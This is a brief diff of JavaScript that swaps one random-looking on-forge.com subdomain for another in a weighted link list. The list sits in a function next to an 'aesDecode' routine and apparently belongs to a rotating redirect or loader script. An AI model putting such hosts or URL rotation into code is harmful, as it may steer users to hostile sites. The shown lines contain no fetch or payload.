@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://sfghjhgfddfgf.on-forge.com/", weight: 0.5 },
-        { url: "https://sfghjhgfddfgf.on-forge.com/", weight: 0.5 }
+        { url: "https://dshvgdfsgvysdfvds.on-forge.com/", weight: 0.5 },
+        { url: "https://dshvgdfsgvysdfvds.on-forge.com/", weight: 0.5 }
       
     ];
 
